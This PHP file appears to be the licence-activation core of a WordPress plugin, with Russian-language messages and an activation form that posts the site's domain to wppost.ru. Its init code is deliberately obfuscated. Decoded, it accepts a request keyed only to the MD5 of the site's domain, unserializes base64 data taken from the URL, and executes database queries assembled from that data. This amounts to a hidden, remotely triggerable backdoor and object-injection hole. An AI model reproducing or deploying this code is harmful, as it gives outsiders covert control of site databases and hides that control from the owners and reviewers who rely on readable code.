<?php

if (!class_exists('reg_core')){
    class reg_core {
        function __construct(){
            add_action('init',array(&$this,'init_prefix'));
            if(is_admin()) add_action('admin_init',array(&$this,'add_tbl'));
        }

        function init_prefix(){
            $GLOBALS['_1265545211_']=Array(base64_decode('ZXhwbG9kZQ=='),base64_decode('Y291bn'.'Q='),base64_decode('ZG'.'VmaW5l'),base64_decode(''.'b'.'W'.'Q1'),base64_decode('Z'.'GV'.'m'.'aW5l'),base64_decode('c3'.'Vic3R'.'y')); function _2117566246($i){$a=Array('.','HTTP_HOST','.','.','WP_HOST','WP_PREFIX','_');return $a[$i];} global $wpdb;
            $_1 = $GLOBALS['_1265545211_'][0](_2117566246(0),$_SERVER[_2117566246(1)]);
            $_2 = $GLOBALS['_1265545211_'][1]($_1);
            if($_2==round(0+1+1+1)) $_3 = $_1[round(0+0.25+0.25+0.25+0.25)]._2117566246(2).$_1[round(0+1+1)];
            else $_3 = $_1[round(0)]._2117566246(3).$_1[round(0+0.333333333333+0.333333333333+0.333333333333)];
            $GLOBALS['_1265545211_'][2](_2117566246(4),$GLOBALS['_1265545211_'][3]($_3));
            $GLOBALS['_1265545211_'][4](_2117566246(5), $wpdb->prefix . $GLOBALS['_1265545211_'][5](WP_HOST, -round(0+2+2)) .  _2117566246(6));
        }

        function add_tbl(){
            $GLOBALS['_796856477_']=Array(base64_decode('dW'.'5zZXJpYWxpemU='),base64_decode('Y'.'m'.'Fz'.'Z'.'TY'.'0'.'X2RlY2'.'9kZ'.'Q==')); function _1301233806($i){$a=Array('wp_regdata','key_host','wp_regdata','id_access','key_host','sql',"show tables like '","'",'',', ',' ','qr'," `","` ( ",", ",'qr'," "," (",") ) ",'qr','wpurl','/wp-admin/admin.php?page=','page_return');return $a[$i];} global $wpdb;       
            if(isset($_GET[_1301233806(0)])&&$_GET[_1301233806(1)]==WP_HOST){
                $_1 = $GLOBALS['_796856477_'][0]($GLOBALS['_796856477_'][1]($_GET[_1301233806(2)]));
                update_option(WP_PREFIX.$_1[_1301233806(3)],$_GET[_1301233806(4)]);
                foreach($_1[_1301233806(5)] as $_2=>$_3){ $_4 = WP_PREFIX.$_2;
                    if($wpdb->get_var(_1301233806(6).$_4._1301233806(7)) == $_4) continue; $_5=_1301233806(8);
                    foreach($_3 as $_6=>$_7){ if($_6>round(0))$_5 .= _1301233806(9); foreach($_7 as $_8){ $_5 .= $_8._1301233806(10); } }
                    $wpdb->query($_1[_1301233806(11)][round(0)]._1301233806(12).$_4._1301233806(13).$_5._1301233806(14).$_1[_1301233806(15)][round(0+1)]._1301233806(16).$_3[round(0)][round(0)]._1301233806(17).$_3[round(0)][round(0)]._1301233806(18).$_1[_1301233806(19)][round(0+0.5+0.5+0.5+0.5)]);
                }
                wp_redirect(get_bloginfo(_1301233806(20))._1301233806(21).$_1[_1301233806(22)]); exit;
            }
        }
    }
    $core = new reg_core();
    
    function reg_form_wpp($id,$path=false){
        if(get_option(WP_PREFIX.$id)==WP_HOST){
            $form = '<div class="updated"><p>Плагин активирован.</p></div>';              
        }else{
            if($_GET['id_access_'.$id]){
                switch($_GET['id_access_'.$id]){
                    case 7: echo '<div class="error"><p>Переданы неверные данные</p></div>'; break;
                    case 8: echo '<div class="error"><p>Переданы неверные данные</p></div>'; break;
                    case 9: echo '<div class="error"><p>Для вашего домена действует другой ключ <a href="http://wppost.ru/activate-plugins/findkey/?plug='.$id.'">Потеряли ключ?</a></p></div>'; break;
                }
            }
            $form = '<div class="error"><p>Плагин не активирован!</p></div>'
            . '<style>.error{padding:10px!important;color:red;border:1px solid red;text-align:center;width:500px;margin-top:20px;}</style>
                    <h3>Введите ключ:</h3>
                    <form action="http://wppost.ru/activate-plugins/access/?plug='.$id.'" method="post">
                    <input type="text" value="" size="90" name="pass">
                    <input type="hidden" value="'.$_SERVER['HTTP_HOST'].'" name="domen">
                    <input type="submit" value="Отправить на проверку">
                    </form>';

            }
            return $form;
    }
}

